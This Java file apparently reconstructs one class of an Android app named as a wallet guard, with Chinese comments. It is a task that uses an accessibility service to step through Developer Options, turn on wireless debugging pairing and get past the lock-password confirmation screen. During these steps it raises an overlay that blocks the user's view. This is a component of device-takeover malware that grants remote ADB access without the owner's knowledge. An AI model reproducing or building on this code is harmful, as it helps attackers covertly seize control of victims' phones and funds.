/**
 * 无线配对调度任务 — OpenDevelopmentDelegate 的 9 个 case 分发。
 *
 * vendor 原始类: o/s.java (123 行)
 * 管理开发者选项 -> 无线调试 -> 配对流程。
 */
package com.guard.wallet.delegate.task;

import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.LinkedList;
import java.util.concurrent.atomic.AtomicReference;

public final class WirelessPairTask implements Runnable {

    /** vendor a — dispatch case id */
    public final int a;

    /** vendor b — reference to WirelessPairDelegate (t) */
    public final com.guard.wallet.delegate.OpenDevelopmentDelegate b;

    public WirelessPairTask(com.guard.wallet.delegate.OpenDevelopmentDelegate tVar, int caseId) {
        this.a = caseId;
        this.b = tVar;
    }

    @Override
    public final void run() {
        com.guard.wallet.enums.DevelopmentStage defaultState = com.guard.wallet.enums.DevelopmentStage.m;
        int caseId = this.a;
        com.guard.wallet.delegate.OpenDevelopmentDelegate engine = this.b;

        switch (caseId) {
            case 0:
                /* Enter develop options main flow */
                engine.Q();
                return;

            case 1:
                /* Handle wireless debug pairing */
                engine.U();
                return;

            case 2:
                /* If in confirm lock window -> set state to ENTER_CONFIRM_LOCK_WIN */
                if (engine.I()) {
                    engine.o.set(com.guard.wallet.enums.DevelopmentStage.g);
                }
                return;

            case 3:
                /* Handle confirm lock password */
                engine.R();
                return;

            case 4:
                /* Complex navigation: check multiple windows, dispatch accordingly */
                if (engine.I() || engine.q(Collections.singletonList(com.guard.wallet.delegate.OpenDevelopmentDelegate.M()))) {
                    return;
                }
                boolean devEnabled = com.guard.wallet.utils.SystemHelper.K();
                com.guard.wallet.enums.DevelopmentStage enabledState = com.guard.wallet.enums.DevelopmentStage.i;
                AtomicReference stateRef = engine.o;

                if (devEnabled || engine.J()) {
                    stateRef.set(enabledState);
                    com.guard.wallet.helper.BlockViewManager.h(8);
                    engine.T();
                } else {
                    if (com.guard.wallet.delegate.OpenDevelopmentDelegate.a0()) {
                        stateRef.set(com.guard.wallet.enums.DevelopmentStage.k);
                        com.guard.wallet.helper.BlockViewManager.h(8);
                    }
                    if (engine.q(Collections.singletonList(com.guard.wallet.delegate.OpenDevelopmentDelegate.M()))) {
                        engine.R();
                    } else if (engine.H()) {
                        engine.Q();
                    } else {
                        LinkedList windows = new LinkedList();
                        windows.add(com.guard.wallet.delegate.OpenDevelopmentDelegate.d0());
                        windows.add(com.guard.wallet.delegate.OpenDevelopmentDelegate.g0());
                        if (engine.q(windows)) {
                            engine.U();
                        }
                    }
                }
                return;

            case 5:
                /* Direct enable dev option success */
                engine.T();
                return;

            case 6:
                /* Pair complete with full cleanup */
                if (engine.J()) {
                    engine.c0();
                    engine.o.set(defaultState);
                    if (MyAccessibilityService.P() != null) {
                        MyAccessibilityService.P().u();
                        MyAccessibilityService.P().z();
                        com.guard.wallet.helper.BlockViewManager.h(10);
                    }
                }
                return;

            case 7:
                /* Pair complete with partial cleanup (no u() call) */
                if (engine.J()) {
                    engine.c0();
                    engine.o.set(defaultState);
                    if (MyAccessibilityService.P() != null) {
                        MyAccessibilityService.P().z();
                        com.guard.wallet.helper.BlockViewManager.h(10);
                    }
                }
                return;

            default:
                /* Fallback case */
                engine.S();
        }
    }
}
